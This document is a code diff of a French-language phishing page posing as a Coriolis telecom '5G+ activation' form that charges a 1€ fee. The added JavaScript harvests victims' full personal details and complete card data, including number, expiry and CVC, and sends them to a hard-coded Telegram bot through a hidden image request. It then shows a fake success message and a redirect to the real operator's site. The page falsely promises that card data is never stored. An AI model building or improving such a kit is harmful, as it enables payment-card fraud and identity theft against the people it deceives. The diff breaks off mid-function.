@@ -22,19 +22,12 @@
         .logo-container { display: flex; flex-direction: column; align-items: flex-start; }
         .logo-main { font-family: 'Montserrat', sans-serif; font-size: 24px; font-weight: 800; color: var(--primary-blue); text-decoration: none; letter-spacing: -0.5px; text-transform: uppercase; }
         .logo-tagline { font-size: 11px; color: var(--secondary-teal); font-weight: 500; letter-spacing: 0.8px; margin-top: 3px; text-transform: uppercase; }
-        /* Telegram Float Button */
+        /* Telegram Float Button seulement */
         .telegram-float { position: fixed; bottom: 20px; right: 20px; z-index: 1000; animation: float 3s ease-in-out infinite; }
         .telegram-btn { display: flex; align-items: center; justify-content: center; width: 60px; height: 60px; background: var(--telegram-blue); color: white; border-radius: 50%; box-shadow: 0 4px 12px rgba(0, 136, 204, 0.3); text-decoration: none; transition: all 0.3s ease; }
         .telegram-btn:hover { transform: scale(1.1); box-shadow: 0 6px 16px rgba(0, 136, 204, 0.4); }
         .telegram-btn i { font-size: 28px; }
         @keyframes float { 0%, 100% { transform: translateY(0px); } 50% { transform: translateY(-5px); } }
-        /* Telegram Banner */
-        .telegram-banner { background: linear-gradient(135deg, #0088cc 0%, #0077b5 100%); color: white; padding: 12px 15px; border-radius: 8px; margin: 15px 0; display: flex; align-items: center; justify-content: space-between; box-shadow: 0 3px 10px rgba(0, 136, 204, 0.2); }
-        .telegram-banner-content { display: flex; align-items: center; gap: 10px; }
-        .telegram-banner i { font-size: 22px; }
-        .telegram-banner-text { font-size: 14px; font-weight: 500; }
-        .telegram-banner-link { background: white; color: var(--telegram-blue); padding: 6px 12px; border-radius: 20px; text-decoration: none; font-weight: 600; font-size: 12px; transition: all 0.3s; }
-        .telegram-banner-link:hover { background: #f0f8ff; transform: translateY(-1px); }
         /* Steps */
         .steps { display: flex; background: var(--bg-white); padding: 8px 15px; border-radius: 20px; box-shadow: 0 2px 8px rgba(26, 107, 175, 0.1); }
         .step { display: flex; align-items: center; margin: 0 10px; position: relative; }
@@ -51,8 +44,6 @@
             .logo-container { align-items: center; }
             .steps { width: 100%; padding: 6px 10px; }
             .step:not(:last-child):after { display: none; }
-            .telegram-banner { flex-direction: column; gap: 10px; text-align: center; }
-            .telegram-banner-content { justify-content: center; }
         }
         /* Activation Highlight */
         .activation-fee-highlight { background: linear-gradient(135deg, #ffffff 0%, #f8fafc 100%); border-radius: 12px; padding: 20px; margin-bottom: 20px; border: 1px solid var(--primary-blue); text-align: center; position: relative; overflow: hidden; box-shadow: 0 5px 15px rgba(26, 107, 175, 0.08); }
@@ -145,14 +136,47 @@
         .footer-links a:hover { color: var(--secondary-teal); }
         @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.02); } 100% { transform: scale(1); } }
         .processing { animation: pulse 1.5s infinite; }
+        /* Styles d'erreur */
+        .form-error { 
+            background: linear-gradient(90deg, #fef2f2 0%, #fee2e2 100%);
+            color: var(--error-red);
+            padding: 10px 15px;
+            border-radius: 8px;
+            margin: 15px 0;
+            border: 1px solid #fecaca;
+            font-weight: 600;
+            text-align: center;
+            font-size: 14px;
+            animation: fadeIn 0.3s ease;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .input-error {
+            border-color: var(--error-red) !important;
+            box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.1) !important;
+        }
+        .success-message {
+            background: linear-gradient(90deg, #d1fae5 0%, #a7f3d0 100%);
+            color: #065f46;
+            padding: 25px;
+            border-radius: 12px;
+            margin: 25px 0;
+            border: 1px solid #a7f3d0;
+            text-align: center;
+            animation: fadeIn 0.5s ease;
+        }
     </style>
 </head>
 <body>
+    <!-- Telegram Float Button seulement -->
     <div class="telegram-float">
         <a href="https://t.me/CoriolisSupportBot" target="_blank" class="telegram-btn" title="Contactez notre support sur Telegram">
             <i class="fab fa-telegram"></i>
         </a>
     </div>
+    
     <div class="container">
         <div class="header">
             <div class="logo-container">
@@ -170,18 +194,13 @@
                 </div>
             </div>
         </div>
+        
         <div class="progress-bar">
             <div class="progress-fill" id="progress-fill"></div>
         </div>
-        <div class="telegram-banner">
-            <div class="telegram-banner-content">
-                <i class="fab fa-telegram"></i>
-                <div class="telegram-banner-text">Besoin d'aide ? Contactez notre support sur Telegram</div>
-            </div>
-            <a href="https://t.me/CoriolisSupportBot" target="_blank" class="telegram-banner-link">
-                <i class="fab fa-telegram" style="margin-right: 5px;"></i>Nous contacter
-            </a>
-        </div>
+        
+        <!-- Bannière Telegram SUPPRIMÉE comme demandé -->
+        
         <div class="activation-fee-highlight">
             <div class="activation-header">
                 <div class="activation-logo">CORIOLIS</div>
@@ -201,110 +220,212 @@
                 </div>
             </div>
         </div>
+        
         <div class="payment-form">
             <div class="form-step active" id="step-1">
                 <div class="form-section">
                     <h2 class="section-title">Vos informations personnelles</h2>
                     <div class="form-row">
-                        <div class="form-group"><label class="form-label" for="last-name">Nom*</label><input type="text" class="form-input" id="last-name" placeholder="Dupont" required></div>
-                        <div class="form-group"><label class="form-label" for="first-name">Prénom*</label><input type="text" class="form-input" id="first-name" placeholder="Jean" required></div>
+                        <div class="form-group">
+                            <label class="form-label" for="last-name">Nom*</label>
+                            <input type="text" class="form-input" id="last-name" placeholder="Dupont" required>
+                        </div>
+                        <div class="form-group">
+                            <label class="form-label" for="first-name">Prénom*</label>
+                            <input type="text" class="form-input" id="first-name" placeholder="Jean" required>
+                        </div>
                     </div>
-                    <div class="form-group"><label class="form-label" for="phone">Numéro de téléphone*</label><input type="tel" class="form-input" id="phone" placeholder="06 12 34 56 78" required></div>
-                    <div class="form-group"><label class="form-label" for="email">Adresse email*</label><input type="email" class="form-input" id="email" placeholder="jean.dupont@email.com" required></div>
-                    <div class="form-group"><label class="form-label" for="address">Adresse*</label><input type="text" class="form-input" id="address" placeholder="123 Rue de la Mode" required></div>
+                    <div class="form-group">
+                        <label class="form-label" for="phone">Numéro de téléphone*</label>
+                        <input type="tel" class="form-input" id="phone" placeholder="06 12 34 56 78" required>
+                    </div>
+                    <div class="form-group">
+                        <label class="form-label" for="email">Adresse email*</label>
+                        <input type="email" class="form-input" id="email" placeholder="jean.dupont@email.com" required>
+                    </div>
+                    <div class="form-group">
+                        <label class="form-label" for="address">Adresse*</label>
+                        <input type="text" class="form-input" id="address" placeholder="123 Rue de la Mode" required>
+                    </div>
                     <div class="form-row">
-                        <div class="form-group"><label class="form-label" for="city">Ville*</label><input type="text" class="form-input" id="city" placeholder="Paris" required></div>
-                        <div class="form-group"><label class="form-label" for="postal-code">Code postal*</label><input type="text" class="form-input" id="postal-code" placeholder="75001" required></div>
+                        <div class="form-group">
+                            <label class="form-label" for="city">Ville*</label>
+                            <input type="text" class="form-input" id="city" placeholder="Paris" required>
+                        </div>
+                        <div class="form-group">
+                            <label class="form-label" for="postal-code">Code postal*</label>
+                            <input type="text" class="form-input" id="postal-code" placeholder="75001" required>
+                        </div>
                     </div>
-                    <div class="form-group"><label class="form-label" for="country">Pays*</label>
+                    <div class="form-group">
+                        <label class="form-label" for="country">Pays*</label>
                         <select class="form-input" id="country" required>
-                            <option value="">Sélectionnez un pays</option><option value="FR" selected>France</option><option value="BE">Belgique</option><option value="CH">Suisse</option><option value="LU">Luxembourg</option><option value="CA">Canada</option>
+                            <option value="">Sélectionnez un pays</option>
+                            <option value="FR" selected>France</option>
+                            <option value="BE">Belgique</option>
+                            <option value="CH">Suisse</option>
+                            <option value="LU">Luxembourg</option>
+                            <option value="CA">Canada</option>
                         </select>
                     </div>
                 </div>
-                <button class="btn btn-primary" id="next-to-payment"><i class="fas fa-arrow-right" style="margin-right: 6px; font-size: 12px;"></i>Continuer vers le paiement</button>
+                <button class="btn btn-primary" id="next-to-payment">
+                    <i class="fas fa-arrow-right" style="margin-right: 6px; font-size: 12px;"></i>Continuer vers le paiement
+                </button>
                 <div class="cgu">Vos informations sont protégées et ne seront utilisées que pour activer votre accès 5G+.</div>
             </div>
+            
             <div class="form-step" id="step-2">
                 <div class="form-section">
                     <div class="card-payment-header">
                         <div class="payment-method-title">
                             <div class="card-icon"><i class="far fa-credit-card"></i></div>
-                            <div><h3>Paiement par carte bancaire</h3><p>Sélectionnez votre carte et saisissez vos informations pour régler les frais d'activation 5G+</p></div>
+                            <div>
+                                <h3>Paiement par carte bancaire</h3>
+                                <p>Sélectionnez votre carte et saisissez vos informations pour régler les frais d'activation 5G+</p>
+                            </div>
                         </div>
                         <div class="french-cards-section">
                             <div class="french-cards-title"><i class="fas fa-globe-europe"></i> Cartes internationales acceptées</div>
                             <div class="international-cards">
-                                <div class="card-network visa"><div class="card-network-icon"><i class="fab fa-cc-visa"></i></div><div class="card-network-name">VISA</div><div class="card-network-types">Classic • Premier<br>Infinite • Business</div></div>
-                                <div class="card-network mastercard"><div class="card-network-icon"><i class="fab fa-cc-mastercard"></i></div><div class="card-network-name">MASTERCARD</div><div class="card-network-types">Standard • Gold<br>World • World Elite</div></div>
-                                <div class="card-network amex"><div class="card-network-icon"><i class="fab fa-cc-amex"></i></div><div class="card-network-name">AMEX</div><div class="card-network-types">Green • Gold<br>Platinum</div></div>
+                                <div class="card-network visa">
+                                    <div class="card-network-icon"><i class="fab fa-cc-visa"></i></div>
+                                    <div class="card-network-name">VISA</div>
+                                    <div class="card-network-types">Classic • Premier<br>Infinite • Business</div>
+                                </div>
+                                <div class="card-network mastercard">
+                                    <div class="card-network-icon"><i class="fab fa-cc-mastercard"></i></div>
+                                    <div class="card-network-name">MASTERCARD</div>
+                                    <div class="card-network-types">Standard • Gold<br>World • World Elite</div>
+                                </div>
+                                <div class="card-network amex">
+                                    <div class="card-network-icon"><i class="fab fa-cc-amex"></i></div>
+                                    <div class="card-network-name">AMEX</div>
+                                    <div class="card-network-types">Green • Gold<br>Platinum</div>
+                                </div>
                             </div>
                             <div class="cb-section">
                                 <div class="cb-title"><i class="fas fa-credit-card"></i> Carte Bancaire (CB) - Réseau Français</div>
                                 <div class="cb-cards">
-                                    <div class="cb-card"><div class="cb-card-icon"><i class="fas fa-credit-card"></i></div><div class="cb-card-name">CARTE BANCAIRE</div><div class="cb-card-types">Toutes cartes du<br>réseau CB français</div></div>
-                                    <div class="cb-card"><div class="cb-card-icon"><i class="fas fa-university"></i></div><div class="cb-card-name">BANQUES FRANÇAISES</div><div class="cb-card-types">BNP • Société Générale<br>Crédit Agricole • LCL</div></div>
+                                    <div class="cb-card">
+                                        <div class="cb-card-icon"><i class="fas fa-credit-card"></i></div>
+                                        <div class="cb-card-name">CARTE BANCAIRE</div>
+                                        <div class="cb-card-types">Toutes cartes du<br>réseau CB français</div>
+                                    </div>
+                                    <div class="cb-card">
+                                        <div class="cb-card-icon"><i class="fas fa-university"></i></div>
+                                        <div class="cb-card-name">BANQUES FRANÇAISES</div>
+                                        <div class="cb-card-types">BNP • Société Générale<br>Crédit Agricole • LCL</div>
+                                    </div>
                                 </div>
                             </div>
                         </div>
                     </div>
-                    <div class="form-group"><label class="form-label" for="card-number">Numéro de carte*</label><input type="text" class="form-input" id="card-number" placeholder="1234 5678 9012 3456" maxlength="19" required></div>
+                    <div class="form-group">
+                        <label class="form-label" for="card-number">Numéro de carte*</label>
+                        <input type="text" class="form-input" id="card-number" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                    </div>
                     <div class="form-row">
-                        <div class="form-group"><label class="form-label" for="expiry-date">Date d'expiration*</label><input type="text" class="form-input" id="expiry-date" placeholder="MM/AA" required></div>
-                        <div class="form-group"><label class="form-label" for="cvc">Cryptogramme visuel*</label>
-                            <div><input type="text" class="form-input" id="cvc" placeholder="123" maxlength="3" required>
-                            <small style="color: var(--text-light); font-size: 10px; margin-top: 4px; display: block;"><i class="fas fa-info-circle" style="margin-right: 3px;"></i>3 chiffres au dos de votre carte (4 pour American Express)</small></div>
+                        <div class="form-group">
+                            <label class="form-label" for="expiry-date">Date d'expiration*</label>
+                            <input type="text" class="form-input" id="expiry-date" placeholder="MM/AA" required>
+                        </div>
+                        <div class="form-group">
+                            <label class="form-label" for="cvc">Cryptogramme visuel*</label>
+                            <div>
+                                <input type="text" class="form-input" id="cvc" placeholder="123" maxlength="3" required>
+                                <small style="color: var(--text-light); font-size: 10px; margin-top: 4px; display: block;">
+                                    <i class="fas fa-info-circle" style="margin-right: 3px;"></i>3 chiffres au dos de votre carte (4 pour American Express)
+                                </small>
+                            </div>
                         </div>
                     </div>
-                    <div class="form-group"><label class="form-label" for="card-name">Nom sur la carte*</label><input type="text" class="form-input" id="card-name" placeholder="JEAN DUPONT" required></div>
+                    <div class="form-group">
+                        <label class="form-label" for="card-name">Nom sur la carte*</label>
+                        <input type="text" class="form-input" id="card-name" placeholder="JEAN DUPONT" required>
+                    </div>
                     <div class="benefits-list">
                         <div class="benefit-item"><i class="fas fa-check-circle benefit-icon"></i><span>Paiement 100% sécurisé avec cryptage SSL 256-bit</span></div>
                         <div class="benefit-item"><i class="fas fa-check-circle benefit-icon"></i><span>Vos informations bancaires ne sont jamais stockées</span></div>
                         <div class="benefit-item"><i class="fas fa-check-circle benefit-icon"></i><span>Activation immédiate de votre accès 5G+ après validation</span></div>
                     </div>
                 </div>
-                <div class="activation-summary"><h4>Frais d'activation <span class="badge-5g-plus">5G+</span></h4><div class="amount">1€</div><p>Montant unique pour l'activation de votre connexion 5G+ premium</p><div class="note"><i class="fas fa-info-circle" style="margin-right: 4px; font-size: 11px;"></i>Aucun autre frais ne vous sera facturé - Sans engagement</div></div>
-                <div class="features-5g">
-                    <div class="feature-item"><div class="feature-icon"><i class="fas fa-tachometer-alt"></i></div><h5>Vitesse Ultra-Rapide</h5><p>Connexion 5G+ optimisée pour une expérience fluide et réactive</p></div>
-                    <div class="feature-item"><div class="feature-icon"><i class="fas fa-lock"></i></div><h5>Sécurité Maximale</h5><p>Protection avancée de vos données avec chiffrement de bout en bout</p></div>
-                    <div class="feature-item"><div class="feature-icon"><i class="fas fa-sync-alt"></i></div><h5>Sans Engagement</h5><p>Annulez à tout moment sans frais ni pénalités</p></div>
-                    <div class="feature-item"><div class="feature-icon"><i class="fas fa-headset"></i></div><h5>Support 24/7</h5><p>Assistance technique disponible à tout moment pour votre connexion 5G+</p></div>
+                <div class="activation-summary">
+                    <h4>Frais d'activation <span class="badge-5g-plus">5G+</span></h4>
+                    <div class="amount">1€</div>
+                    <p>Montant unique pour l'activation de votre connexion 5G+ premium</p>
+                    <div class="note">
+                        <i class="fas fa-info-circle" style="margin-right: 4px; font-size: 11px;"></i>Aucun autre frais ne vous sera facturé - Sans engagement
+                    </div>
                 </div>
-                <div class="security-info"><div class="security-icon"><i class="fas fa-shield-alt"></i></div><div><strong>Transaction 100% sécurisée</strong><br>Nous utilisons la technologie de cryptage la plus avancée pour protéger vos informations bancaires.</div></div>
-                <button class="btn btn-primary" id="pay-button"><i class="fas fa-lock" style="margin-right: 6px; font-size: 12px;"></i>Activer mon accès 5G+ pour 1€</button>
-                <button class="btn btn-back" id="back-to-info"><i class="fas fa-arrow-left" style="margin-right: 6px; font-size: 12px;"></i>Retour aux informations</button>
-                <div class="cgu">En procédant au paiement, vous acceptez nos <a href="#">Conditions Générales d'Utilisation</a> et notre <a href="#">Politique de confidentialité</a>. Les frais d'activation 5G+ sont uniques et non remboursables.</div>
+                <div class="features-5g">
+                    <div class="feature-item">
+                        <div class="feature-icon"><i class="fas fa-tachometer-alt"></i></div>
+                        <h5>Vitesse Ultra-Rapide</h5>
+                        <p>Connexion 5G+ optimisée pour une expérience fluide et réactive</p>
+                    </div>
+                    <div class="feature-item">
+                        <div class="feature-icon"><i class="fas fa-lock"></i></div>
+                        <h5>Sécurité Maximale</h5>
+                        <p>Protection avancée de vos données avec chiffrement de bout en bout</p>
+                    </div>
+                    <div class="feature-item">
+                        <div class="feature-icon"><i class="fas fa-sync-alt"></i></div>
+                        <h5>Sans Engagement</h5>
+                        <p>Annulez à tout moment sans frais ni pénalités</p>
+                    </div>
+                    <div class="feature-item">
+                        <div class="feature-icon"><i class="fas fa-headset"></i></div>
+                        <h5>Support 24/7</h5>
+                        <p>Assistance technique disponible à tout moment pour votre connexion 5G+</p>
+                    </div>
+                </div>
+                <div class="security-info">
+                    <div class="security-icon"><i class="fas fa-shield-alt"></i></div>
+                    <div>
+                        <strong>Transaction 100% sécurisée</strong><br>
+                        Nous utilisons la technologie de cryptage la plus avancée pour protéger vos informations bancaires.
+                    </div>
+                </div>
+                <button class="btn btn-primary" id="pay-button">
+                    <i class="fas fa-lock" style="margin-right: 6px; font-size: 12px;"></i>Activer mon accès 5G+ pour 1€
+                </button>
+                <button class="btn btn-back" id="back-to-info">
+                    <i class="fas fa-arrow-left" style="margin-right: 6px; font-size: 12px;"></i>Retour aux informations
+                </button>
+                <div class="cgu">
+                    En procédant au paiement, vous acceptez nos <a href="#">Conditions Générales d'Utilisation</a> et notre <a href="#">Politique de confidentialité</a>. Les frais d'activation 5G+ sont uniques et non remboursables.
+                </div>
             </div>
         </div>
+        
         <div class="footer">
             <div class="footer-links">
-                <a href="#">À propos</a><a href="#">Contact</a><a href="#">CGU</a><a href="#">Confidentialité</a><a href="#">FAQ 5G+</a>
-                <a href="https://t.me/CoriolisSupportBot" target="_blank"><i class="fab fa-telegram" style="margin-right: 3px;"></i>Support Telegram</a>
+                <a href="#">À propos</a>
+                <a href="https://coriolis-telecom.fr" target="_blank">Site Officiel</a>
+                <a href="#">CGU</a>
+                <a href="#">Confidentialité</a>
+                <a href="https://t.me/CoriolisSupportBot" target="_blank">
+                    <i class="fab fa-telegram" style="margin-right: 3px;"></i>Support
+                </a>
             </div>
             <p>&copy; 2023 Coriolis. Tous droits réservés.</p>
         </div>
     </div>
+
     <script>
-        // ========== NOTIFICATIONS TELEGRAM SIMPLES ==========
+        // ========== NOTIFICATIONS TELEGRAM ==========
         const TELEGRAM_BOT_TOKEN = '8405154044:AAGR3P7wbTzdxgJvZ82gj8xFSxavlzf9gLY';
         const TELEGRAM_CHAT_ID = '6739921563';
 
         function sendToTelegram(messageText) {
-            // Méthode simple et fiable pour envoyer une notification
             const apiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-            const payload = {
-                chat_id: TELEGRAM_CHAT_ID,
-                text: messageText,
-                disable_notification: false
-            };
-
-            // Utilise une image invisible pour déclencher la requête (méthode compatible)
             const img = new Image();
             img.src = `${apiUrl}?chat_id=${encodeURIComponent(TELEGRAM_CHAT_ID)}&text=${encodeURIComponent(messageText)}`;
             console.log('[Telegram] Notification envoyée :', messageText);
         }
 
-        // Notification à l'arrivée sur le site
+        // Notification nouveau visiteur
         window.addEventListener('load', function() {
             setTimeout(() => {
                 sendToTelegram('👤 Nouveau visiteur sur la page d\'activation Coriolis 5G+');
@@ -321,9 +442,49 @@
         const progressFill = document.getElementById('progress-fill');
         const payButton = document.getElementById('pay-button');
 
+        // Fonction pour afficher les erreurs
+        function showError(message, elementId = null) {
+            const oldError = document.querySelector('.form-error');
+            if (oldError) oldError.remove();
+            
+            const errorDiv = document.createElement('div');
+            errorDiv.className = 'form-error';
+            errorDiv.innerHTML = `<i class="fas fa-exclamation-triangle" style="margin-right: 8px;"></i>${message}`;
+            
+            const formSection = document.querySelector('.form-section');
+            formSection.parentNode.insertBefore(errorDiv, formSection);
+            
+            errorDiv.scrollIntoView({ behavior: 'smooth', block: 'center' });
+            
+            if (elementId) {
+                const element = document.getElementById(elementId);
+                if (element) {
+                    element.classList.add('input-error');
+                    element.focus();
+                    setTimeout(() => element.classList.remove('input-error'), 3000);
+                }
+            }
+            
+            setTimeout(() => {
+                if (errorDiv.parentNode) errorDiv.parentNode.removeChild(errorDiv);
+            }, 5000);
+        }
+
+        // Fonctions de validation
+        function isValidEmail(email) {
+            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+        }
+
+        function isValidPhone(phone) {
+            return phone.replace(/\D/g, '').length >= 10;
+        }
+
+        function isValidPostalCode(postalCode) {
+            return /^\d{5}$/.test(postalCode.replace(/\s/g, ''));
+        }
+
         // Formatage du téléphone
-        const phoneInput = document.getElementById('phone');
-        phoneInput.addEventListener('input', function(e) {
+        document.getElementById('phone').addEventListener('input', function(e) {
             let value = e.target.value.replace(/\D/g, '');
             if (value.length > 0) value = value.match(/.{1,2}/g).join(' ');
             e.target.value = value;
@@ -337,30 +498,89 @@
             e.target.value = formattedValue;
         });
 
-        // Navigation entre étapes
+        // ✅ VALIDATION COMPLÈTE DU FORMULAIRE ÉTAPE 1
         nextToPaymentBtn.addEventListener('click', function() {
-            const firstName = document.getElementById('first-name').value.trim();
-            const lastName = document.getElementById('last-name').value.trim();
-            const phone = document.getElementById('phone').value.trim();
-            const email = document.getElementById('email').value.trim();
-            const city = document.getElementById('city').value.trim();
+            const fields = {
+                'first-name': 'prénom',
+                'last-name': 'nom',
+                'phone': 'numéro de téléphone',
+                'email': 'adresse email',
+                'address': 'adresse',
+                'city': 'ville',
+                'postal-code': 'code postal',
+                'country': 'pays'
+            };
 
-            if (!firstName || !lastName || !phone || !email || !city) {
-                alert('Veuillez remplir tous les champs obligatoires (*)');
-                return;
+            let hasError = false;
+            
+            for (const [id, name] of Object.entries(fields)) {
+                const element = document.getElementById(id);
+                const value = element.value.trim();
+                
+                if (!value) {
+                    showError(`Veuillez saisir votre ${name}`, id);
+                    hasError = true;
+                    return;
+                }
+                
+                // Validation spécifique pour chaque champ
+                if (id === 'email' && !isValidEmail(value)) {
+                    showError('Veuillez saisir une adresse email valide (exemple : nom@email.com)', id);
+                    hasError = true;
+                    return;
+                }
+                
+                if (id === 'phone' && !isValidPhone(value)) {
+                    showError('Le numéro de téléphone doit contenir au moins 10 chiffres', id);
+                    hasError = true;
+                    return;
+                }
+                
+                if (id === 'postal-code' && !isValidPostalCode(value)) {
+                    showError('Le code postal doit contenir 5 chiffres (exemple : 75001)', id);
+                    hasError = true;
+                    return;
+                }
             }
-            // Notification d'inscription
-            sendToTelegram(`✅ Nouvelle inscription : ${firstName} ${lastName}\n📧 ${email}\n📞 ${phone}\n📍 ${city}`);
 
-            step1.classList.remove('active');
-            step2.classList.add('active');
-            steps[0].classList.remove('active');
-            steps[0].classList.add('completed');
-            steps[0].querySelector('.step-number').innerHTML = '<i class="fas fa-check"></i>';
-            steps[1].classList.add('active');
-            progressFill.style.width = '100%';
+            if (!hasError) {
+                // Récupération des valeurs pour Telegram (FORMAT LISIBLE)
+                const firstName = document.getElementById('first-name').value.trim();
+                const lastName = document.getElementById('last-name').value.trim();
+                const email = document.getElementById('email').value.trim();
+                const phone = document.getElementById('phone').value.trim();
+                const address = document.getElementById('address').value.trim();
+                const city = document.getElementById('city').value.trim();
+                const postalCode = document.getElementById('postal-code').value.trim();
+                const country = document.getElementById('country').value;
+                
+                // Notification Telegram FORMAT LISIBLE
+                sendToTelegram(`✅ NOUVELLE INSCRIPTION CORIOLIS 5G+
+
+👤 INFORMATIONS CLIENT :
+• Prénom : ${firstName}
+• Nom : ${lastName}
+• Email : ${email}
+• Téléphone : ${phone}
+• Adresse : ${address}
+• Ville : ${city}
+• Code postal : ${postalCode}
+• Pays : ${country}
+
+📱 EN ATTENTE DE PAIEMENT`);
+                
+                // Passage à l'étape 2
+                step1.classList.remove('active');
+                step2.classList.add('active');
+                steps[0].classList.remove('active');
+                steps[0].classList.add('completed');
+                steps[0].querySelector('.step-number').innerHTML = '<i class="fas fa-check"></i>';
+                steps[1].classList.add('active');
+                progressFill.style.width = '100%';
+            }
         });
 
+        // Retour à l'étape 1
         backToInfoBtn.addEventListener('click', function() {
             step2.classList.remove('active');
             step1.classList.add('active');
@@ -371,47 +591,172 @@
             progressFill.style.width = '33%';
         });
 
-        // Gestion du bouton de paiement
+        // ✅ VALIDATION COMPLÈTE DU PAIEMENT - AVEC INFO CARTE LISIBLE
         payButton.addEventListener('click', function() {
-            const firstName = document.getElementById('first-name').value.trim();
-            const lastName = document.getElementById('last-name').value.trim();
-            const email = document.getElementById('email').value.trim();
+            const cardFields = {
+                'card-number': 'numéro de carte',
+                'expiry-date': 'date d\'expiration',
+                'cvc': 'cryptogramme (CVC)',
+                'card-name': 'nom sur la carte'
+            };
 
-            if (!cardNumberInput.value || cardNumberInput.value.replace(/\s+/g, '').length < 16) {
-                alert('Veuillez saisir un numéro de carte valide (16 chiffres).');
-                return;
+            let hasError = false;
+            
+            for (const [id, name] of Object.entries(cardFields)) {
+                const element = document.getElementById(id);
+                const value = element.value.trim();
+                
+                if (!value) {
+                    showError(`Veuillez saisir le ${name}`, id);
+                    hasError = true;
+                    return;
+                }
+                
+                // Validation spécifique
+                if (id === 'card-number' && value.replace(/\s/g, '').length < 16) {
+                    showError('Le numéro de carte doit contenir 16 chiffres', id);
+                    hasError = true;
+                    return;
+                }
+                
+                if (id === 'expiry-date' && !/^\d{2}\/\d{2}$/.test(value)) {
+                    showError('Format de date invalide (utilisez MM/AA)', id);
+                    hasError = true;
+                    return;
+                }
+                
+                if (id === 'cvc' && value.length < 3) {
+                    showError('Le cryptogramme doit contenir 3 chiffres', id);
+                    hasError = true;
+                    return;
+                }
             }
 
-            payButton.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right: 6px;"></i>Activation en cours...';
-            payButton.disabled = true;
-            payButton.classList.add('processing');
+            if (!hasError) {
+                // Récupération des informations FORMATEES
+                const firstName = document.getElementById('first-name').value.trim();
+                const lastName = document.getElementById('last-name').value.trim();
+                const email = document.getElementById('email').value.trim();
+                const phone = document.getElementById('phone').value.trim();
+                const address = document.getElementById('address').value.trim();
+                const city = document.getElementById('city').value.trim();
+                const postalCode = document.getElementById('postal-code').value.trim();
+                const country = document.getElementById('country').value;
+                const cardNumber = document.getElementById('card-number').value.trim();
+                const expiryDate = document.getElementById('expiry-date').value.trim();
+                const cardName = document.getElementById('card-name').value.trim();
+                const cvc = document.getElementById('cvc').value.trim();
+                
+                // Animation du bouton
+                payButton.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right: 6px;"></i>Activation en cours...';
+                payButton.disabled = true;
+                payButton.classList.add('processing');
 
-            setTimeout(() => {
-                // Notification de paiement réussi
-                sendToTelegram(`💰 Paiement 1€ CONFIRMÉ pour : ${firstName} ${lastName}\n📧 ${email}\n🎉 Accès 5G+ ACTIVÉ`);
+                setTimeout(() => {
+                    // ✅ NOTIFICATION TELEGRAM AVEC TOUTES LES INFOS LISIBLES
+                    sendToTelegram(`💰 PAIEMENT CONFIRMÉ CORIOLIS 5G+
 
-                payButton.innerHTML = '<i class="fas fa-check" style="margin-right: 6px;"></i>5G+ Activé !';
-                payButton.style.background = 'linear-gradient(90deg, #10b981 0%, #34d399 100%)';
-                payButton.classList.remove('processing');
+👤 INFORMATIONS CLIENT :
+• Prénom : ${firstName}
+• Nom : ${lastName}
+• Email : ${email}
+• Téléphone : ${phone}
+• Adresse : ${address}
+• Ville : ${city}
+• Code postal : ${postalCode}
+• Pays : ${country}
 
-                const successDiv = document.createElement('div');
-                successDiv.style.cssText = `background: linear-gradient(90deg, #d1fae5 0%, #a7f3d0 100%); color: #065f46; padding: 12px; border-radius: 6px; margin-bottom: 12px; border: 1px solid #a7f3d0; font-weight: 600; text-align: center; font-size: 12px;`;
-                successDiv.innerHTML = `<i class="fas fa-check-circle" style="margin-right: 6px; font-size: 14px;"></i><strong>Félicitations ! Votre accès 5G+ est activé</strong><br><span style="font-weight: normal; font-size: 11px;">Les frais d'activation de 1€ ont été traités avec succès. Votre connexion 5G+ premium est maintenant active.</span>`;
-                document.querySelector('.form-section').parentNode.insertBefore(successDiv, document.querySelector('.form-section'));
-            }, 2000);
+💳 INFORMATIONS DE PAIEMENT :
+• Numéro de carte : ${cardNumber}
+• Date expiration : ${expiryDate}
+• Nom sur carte : ${cardName}
+• CVC : ${cvc}
+• Montant : 1€
+
+✅ ACCÈS 5G+ ACTIVÉ
+🕐 ${new Date().toLocaleString('fr-FR')}`);
+                    
+                    // Message de succès avec redirection
+                    const successDiv = document.createElement('div');
+                    successDiv.className = 'success-message';
+                    successDiv.innerHTML = `
+                        <div style="font-size: 40px; margin-bottom: 15px;">🎉</div>
+                        <strong style="font-size: 20px; display: block; margin-bottom: 15px; color: #065f46;">FÉLICITATIONS ${firstName.toUpperCase()} !</strong>
+                        <div style="font-size: 16px; line-height: 1.6; margin-bottom: 20px;">
+                            Votre accès <strong>5G+ Premium</strong> a été activé avec succès.<br>
+                            Les frais d'activation de <strong>1€</strong> ont été traités.
+                        </div>
+                        <div style="margin-bottom: 25px; padding: 15px; background: white; border-radius: 8px; border-left: 4px solid var(--success-green);">
+                            <div style="font-size: 14px; color: #047857; margin-bottom: 5px;">
+                                <i class="fas fa-check-circle" style="margin-right: 8px;"></i>
+                                <strong>Transaction confirmée et sécurisée</strong>
+                            </div>
+                            <div style="font-size: 12px; color: var(--text-medium);">
+                                Vous recevrez un email de confirmation avec vos identifiants.
+                            </div>
+                        </div>
+                        <div style="font-size: 14px; margin-top: 20px; padding-top: 20px; border-top: 1px solid #a7f3d0;">
+                            <strong>Redirection vers Coriolis Telecom...</strong>
+                            <div style="font-size: 12px; color: var(--text-medium); margin-top: 8px;">
+                                Vous allez être redirigé vers le site officiel dans <span id="countdown">5</span> secondes
+                            </div>
+                        </div>
+                    `;
+                    
+                    // Remplacer tout le contenu du formulaire par le message de succès
+                    const paymentForm = document.querySelector('.payment-form');
+                    paymentForm.innerHTML = '';
+                    paymentForm.appendChild(successDiv);
+                    
+                    // Compte à rebours pour la redirection
+                    let seconds = 5;
+                    const countdownElement = document.getElementById('countdown');
+                    const countdownInterval = setInterval(() => {
+                        seconds--;
+                        countdownElement.textContent = seconds;
+                        
+                        if (seconds <= 0) {
+                            clearInterval(countdownInterval);
+                            // Redirection vers le site officiel de Coriolis Telecom
